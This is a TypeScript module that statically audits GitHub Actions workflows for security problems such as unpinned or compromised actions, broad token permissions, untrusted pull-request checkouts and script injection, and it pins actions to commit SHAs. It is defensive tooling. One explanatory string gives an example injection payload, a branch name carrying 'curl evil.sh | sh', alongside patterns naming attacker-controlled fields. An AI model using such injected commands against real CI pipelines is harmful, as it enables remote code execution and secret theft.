import yaml from "js-yaml";

// Static security checks for a GitHub Actions workflow — the same classes of problems tools like
// zizmor and actionlint report, explained in plain language. Nothing is executed or sent anywhere.

export type Severity = "high" | "medium" | "low";

export interface AuditFinding {
  id: string;
  severity: Severity;
  title: string;
  detail: string;
  line?: number;
}

export interface ActionUse {
  /** owner/repo (without a sub-path) — what the GitHub API needs */
  repo: string;
  /** full value after uses:, e.g. github/codeql-action/init@v3 */
  value: string;
  ref: string;
  pinned: boolean;
  line: number;
}

const SHA = /^[0-9a-f]{40}$/;

// Event fields an outsider controls (PR titles, branch names, issue bodies…). Putting them into a
// shell or script with ${{ }} lets that outsider run commands in your workflow.
const UNTRUSTED = [
  /github\.event\.issue\.(title|body)/,
  /github\.event\.pull_request\.(title|body)/,
  /github\.event\.pull_request\.head\.(ref|label)/,
  /github\.event\.pull_request\.head\.repo\.default_branch/,
  /github\.event\.comment\.body/,
  /github\.event\.review\.body/,
  /github\.event\.review_comment\.body/,
  /github\.event\.discussion\.(title|body)/,
  /github\.event\.pages\.[^}]*\.page_name/,
  /github\.event\.commits\.[^}]*\.(message|author\.(email|name))/,
  /github\.event\.head_commit\.(message|author\.(email|name))/,
  /github\.event\.workflow_run\.(head_branch|head_commit\.message|display_title)/,
  /github\.head_ref/,
];

// Actions whose tags were moved to malicious commits in the March 2025 supply-chain attack.
const COMPROMISED = new Set(["tj-actions/changed-files", "tj-actions/eslint-changed-files", "reviewdog/action-setup"]);

type Obj = Record<string, unknown>;
const isObj = (v: unknown): v is Obj => typeof v === "object" && v !== null && !Array.isArray(v);

function lineOf(lines: string[], needle: string, from = 0): number | undefined {
  for (let i = from; i < lines.length; i++) if (lines[i].includes(needle)) return i + 1;
  return undefined;
}

/** Every `uses:` reference with its line number. */
export function findActionUses(text: string): ActionUse[] {
  const out: ActionUse[] = [];
  text.split(/\r?\n/).forEach((l, i) => {
    const m = l.match(/^\s*(?:-\s+)?uses:\s*["']?([^\s"'#]+)["']?/);
    if (!m) return;
    const value = m[1];
    if (value.startsWith("./") || value.startsWith("docker://")) return;
    const at = value.lastIndexOf("@");
    if (at < 0) return;
    const path = value.slice(0, at);
    const ref = value.slice(at + 1);
    out.push({ repo: path.split("/").slice(0, 2).join("/"), value, ref, pinned: SHA.test(ref), line: i + 1 });
  });
  return out;
}

function triggerNames(on: unknown): string[] {
  if (typeof on === "string") return [on];
  if (Array.isArray(on)) return on.map(String);
  if (isObj(on)) return Object.keys(on);
  return [];
}

export function auditWorkflow(text: string): { findings: AuditFinding[]; uses: ActionUse[]; error?: string } {
  let doc: unknown;
  try {
    doc = yaml.load(text);
  } catch (e) {
    return { findings: [], uses: [], error: e instanceof Error ? e.message.split("\n")[0] : "Invalid YAML" };
  }
  if (!isObj(doc) || !isObj(doc.jobs)) return { findings: [], uses: [], error: "This doesn't look like a workflow — there's no jobs: section." };

  const lines = text.split(/\r?\n/);
  const findings: AuditFinding[] = [];
  const add = (f: AuditFinding) => findings.push(f);
  // js-yaml (YAML 1.1) reads a bare `on:` key as the boolean true
  const triggers = triggerNames(doc.on ?? (doc as Record<string, unknown>)["true"]);
  const jobs = doc.jobs as Obj;

  // 1. Unpinned and known-compromised actions
  const uses = findActionUses(text);
  for (const u of uses) {
    if (COMPROMISED.has(u.repo)) {
      add({
        id: "compromised-action",
        severity: "high",
        title: `${u.repo} was compromised in March 2025`,
        detail: "Attackers moved its version tags to a commit that dumped CI secrets into the logs. Remove it or pin to a commit you've reviewed, and rotate any secrets that workflow could read.",
        line: u.line,
      });
    }
    if (!u.pinned) {
      const firstParty = /^(actions|github)\//.test(u.repo);
      add({
        id: "unpinned-action",
        severity: firstParty ? "medium" : "high",
        title: `${u.value} uses a movable tag`,
        detail: `Whoever controls ${u.repo} can point "${u.ref}" at different code at any time, and your next run will execute it with your secrets. Pin to the full 40-character commit SHA and keep the version as a comment (e.g. @<sha> # ${u.ref}).`,
        line: u.line,
      });
    }
  }

  // 2. Token permissions
  if (doc.permissions === "write-all") {
    add({ id: "write-all", severity: "high", title: "permissions: write-all", detail: "Every job gets a token that can push code, edit releases and change settings. Grant only what each job needs, e.g. contents: read.", line: lineOf(lines, "write-all") });
  } else if (doc.permissions === undefined) {
    const jobsWithout = Object.entries(jobs).filter(([, j]) => isObj(j) && j.permissions === undefined && !j.uses).map(([k]) => k);
    if (jobsWithout.length) {
      add({
        id: "no-permissions",
        severity: "medium",
        title: "No permissions: block",
        detail: `Job${jobsWithout.length > 1 ? "s" : ""} ${jobsWithout.join(", ")} get the repository's default token, which is read-write on many older repos and organisations. Add "permissions:\n  contents: read" at the top and widen it per job only where needed.`,
      });
    }
  }

  // 3. Dangerous triggers that check out untrusted code
  const headCheckout = /\$\{\{\s*(github\.event\.pull_request\.head\.(sha|ref)|github\.head_ref|github\.event\.workflow_run\.head_(sha|branch))\s*\}\}/;
  const privileged = triggers.filter((t) => t === "pull_request_target" || t === "workflow_run");
  for (const [jobName, job] of Object.entries(jobs)) {
    if (!isObj(job)) continue;
    const steps = Array.isArray(job.steps) ? job.steps.filter(isObj) : [];

    for (const step of steps) {
      const usesValue = typeof step.uses === "string" ? step.uses : "";
      const withObj = isObj(step.with) ? step.with : {};
      if (privileged.length && usesValue.startsWith("actions/checkout") && typeof withObj.ref === "string" && headCheckout.test(withObj.ref)) {
        add({
          id: "untrusted-checkout",
          severity: "high",
          title: `${privileged.join("/")} checks out the pull request's code (job "${jobName}")`,
          detail: `${privileged.join("/")} runs with your secrets and a write token even for pull requests from forks. Checking out the PR head and then building or testing it lets anyone run code with those privileges. Run untrusted code in a plain pull_request workflow and only use the results here.`,
          line: lineOf(lines, String(withObj.ref)),
        });
      }
      if (usesValue.startsWith("actions/checkout") && withObj["persist-credentials"] !== false) {
        add({
          id: "persist-credentials",
          severity: "low",
          title: `checkout leaves the token on disk (job "${jobName}")`,
          detail: "actions/checkout saves the GITHUB_TOKEN in .git/config, where every later step (and anything uploaded as an artifact) can read it. Add with: persist-credentials: false unless a later step pushes with git.",
          line: lineOf(lines, usesValue),
        });
      }

      // 4. Script injection through ${{ }} in run: and github-script
      const code = typeof step.run === "string" ? step.run : usesValue.startsWith("actions/github-script") && typeof withObj.script === "string" ? withObj.script : "";
      for (const expr of code.match(/\$\{\{[^}]*\}\}/g) ?? []) {
        if (UNTRUSTED.some((re) => re.test(expr))) {
          add({
            id: "script-injection",
            severity: "high",
            title: `Untrusted input in a script: ${expr}`,
            detail: `${expr} is pasted into the script before it runs, so a PR title or branch name like "x; curl evil.sh | sh" becomes a command. Pass it through an environment variable instead: env: VALUE: ${expr} and use "$VALUE" in the script.`,
            line: lineOf(lines, expr),
          });
        }
      }
    }

    // 5. Self-hosted runners on pull requests
    const runsOn = JSON.stringify(job["runs-on"] ?? "");
    if (runsOn.includes("self-hosted") && triggers.some((t) => t === "pull_request" || t === "pull_request_target")) {
      add({
        id: "self-hosted-pr",
        severity: "medium",
        title: `Self-hosted runner on pull requests (job "${jobName}")`,
        detail: "On a public repository anyone can open a pull request, and the runner machine executes their code. Use GitHub-hosted runners for PRs, or require approval for outside contributors.",
        line: lineOf(lines, "self-hosted"),
      });
    }
  }

  if (privileged.includes("pull_request_target") && !findings.some((f) => f.id === "untrusted-checkout")) {
    add({
      id: "pull-request-target",
      severity: "low",
      title: "Uses pull_request_target",
      detail: "This trigger runs with secrets and a write token for pull requests from forks. It's safe only while the workflow never runs code from the pull request — keep it that way when editing.",
      line: lineOf(lines, "pull_request_target"),
    });
  }

  if (/ACTIONS_ALLOW_UNSECURE_COMMANDS\s*:\s*['"]?true/i.test(text)) {
    add({ id: "unsecure-commands", severity: "high", title: "ACTIONS_ALLOW_UNSECURE_COMMANDS is enabled", detail: "This re-enables the old set-env/add-path commands, which let any log output change environment variables of later steps. Use $GITHUB_ENV and $GITHUB_PATH instead.", line: lineOf(lines, "ACTIONS_ALLOW_UNSECURE_COMMANDS") });
  }

  const order: Record<Severity, number> = { high: 0, medium: 1, low: 2 };
  findings.sort((a, b) => order[a.severity] - order[b.severity] || (a.line ?? 0) - (b.line ?? 0));
  return { findings, uses };
}

/** Rewrites `uses: owner/repo@tag` lines to `owner/repo@<sha> # tag` using resolved SHAs (key = full value). */
export function pinWorkflow(text: string, resolved: Map<string, string>): string {
  return text
    .split(/(\r?\n)/)
    .map((l) =>
      l.replace(/^(\s*(?:-\s+)?uses:\s*["']?)([^\s"'#]+)(["']?)(\s*#.*)?$/, (all, pre: string, value: string, quote: string) => {
        const sha = resolved.get(value);
        if (!sha) return all;
        const ref = value.slice(value.lastIndexOf("@") + 1);
        return `${pre}${value.slice(0, value.lastIndexOf("@"))}@${sha}${quote} # ${ref}`;
      })
    )
    .join("");
}
